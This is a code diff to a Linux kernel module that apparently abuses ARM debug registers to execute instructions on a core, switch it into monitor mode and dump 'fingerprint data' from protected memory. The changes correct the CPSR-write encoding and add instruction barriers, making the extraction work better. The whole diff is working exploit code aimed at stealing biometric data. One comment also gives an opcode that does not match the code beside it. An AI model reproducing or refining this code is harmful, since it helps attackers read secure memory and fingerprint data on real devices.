@@ -1,3 +1,4 @@
+
 #include <linux/module.h>    // included for all kernel modules
 #include <linux/kernel.h>    // included for KERN_INFO
 #include <linux/init.h>      // included for __init and __exit macros
@@ -77,8 +78,8 @@ static uint32_t read_memory_via_dcc(void __iomem *debug, uint32_t addr) {
 }
 
 static void output_fingerprint_data(void __iomem* debug, uint32_t start, uint32_t size) {
-    uint32_t i, addr, reg;
-    printk(KERN_INFO "--------------------\n");
+    uint32_t i, addr;
+    printk(KERN_INFO "--------------------Fingerprint Start\n");
     for (i = 0; i < size; i = i + 0x10) {
         addr = start + i;
         printk(KERN_INFO "%08x: %08x %08x %08x %08x\n", addr, 
@@ -87,7 +88,7 @@ static void output_fingerprint_data(void __iomem* debug, uint32_t start, uint32_
             read_memory_via_dcc(debug, addr + 0x8),
             read_memory_via_dcc(debug, addr + 0xc));
     }
-    printk(KERN_INFO "--------------------\n");
+    printk(KERN_INFO "--------------------Fingerprint End\n");
 }
 
 static void fingerprint_extraction(void __iomem* debug_register) {
@@ -130,8 +131,10 @@ static void fingerprint_extraction(void __iomem* debug_register) {
     execute_ins_via_itr(debug_register, 0xe3c0001f);
     // 0xe3800016 <=> orr R0, R0, 0x16
     execute_ins_via_itr(debug_register, 0xe3800016);
-    // 0xe129f000 <=> msr CPSR, R0
-    execute_ins_via_itr(debug_register, 0xe129f000);
+    // 0xe122f000 <=> msr CPSR_fsxc, R0
+    execute_ins_via_itr(debug_register, 0xe12ff000);
+    // 0xf57ff06f <=> isb
+    execute_ins_via_itr(debug_register, 0xf57ff06f);
 
     // Step 7: Read the fingerprint data
     printk(KERN_INFO "Step 7: Output fingerprint data\n");
@@ -146,8 +149,10 @@ static void fingerprint_extraction(void __iomem* debug_register) {
     // 0xe3c0001f <=> bic R0, R0, 0x1f
     execute_ins_via_itr(debug_register, 0xe3c0001f);
     execute_ins_via_itr(debug_register, 0xe3800000 | (cpsr_old & 0x1f));    
-    // 0xe129f000 <=> msr CPSR, R0
-    execute_ins_via_itr(debug_register, 0xe129f000);
+    // 0xe12ff000 <=> msr CPSR_fsxc, R0
+    execute_ins_via_itr(debug_register, 0xe12ff000);
+    // 0xf57ff06f <=> isb
+    execute_ins_via_itr(debug_register, 0xf57ff06f);
     
     // Step 9: Restore R0 from stack
     printk(KERN_INFO "Step 9: Restore R0 from the stack\n");
